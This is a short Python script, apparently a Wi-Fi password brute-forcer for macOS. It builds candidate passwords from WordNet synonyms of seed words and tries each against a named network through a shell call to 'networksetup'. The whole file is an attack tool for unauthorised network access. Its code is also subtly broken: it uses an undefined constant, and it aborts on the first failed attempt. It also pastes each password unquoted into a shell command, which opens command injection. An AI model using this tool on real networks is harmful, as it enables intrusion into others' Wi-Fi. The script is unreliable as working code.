import itertools
import subprocess
import nltk; nltk.download('wordnet')
from nltk.corpus import wordnet


class Trishul:

    def __init__(self, device: str, network: str, initial_seed_words: list[str] = None, combination_depth: int = 3):
        self.device = device
        self.network = network
        self.initial_seed_words = initial_seed_words
        self.seed_words = []
        self.combination_depth = combination_depth

    def expand_seed_words(self):
        seed_words = self.initial_seed_words[:]
        for word in self.initial_seed_words:
            [[seed_words.append(name.name()) for name in lemma.lemmas()] for lemma in wordnet.synsets(word)]
        self.seed_words = list(set(seed_words))

    def make_password_iterator(self) -> iter:
        return itertools.permutations(self.seed_words, COMBINATION_DEPTH)

    def login(self, password: str) -> subprocess.CompletedProcess:
        command = " ".join(["networksetup", "setairportnetwork", self.device, self.network, password])
        output = subprocess.run(command, shell=True, check=True, capture_output=True)
        return output

    def try_passwords(self, passwords: iter) -> dict:
        for combination in passwords:
            password = "".join(combination)
            print("Trying " + password)
            output = self.login(password)
            print(output.stdout)
            if len(output.stdout) == 0:
                return {"status": 0, "message": "Password found!", "password": password}
        return {"status": 1, "message": "Password not found.", "password": None}

    def run(self) -> dict:
        self.expand_seed_words()
        passwords = self.make_password_iterator()
        return self.try_passwords(passwords)


if __name__ == "__main__":
    print(Trishul("en0", "JuliusCaesar", ["roman", "emperor"], 3).run())

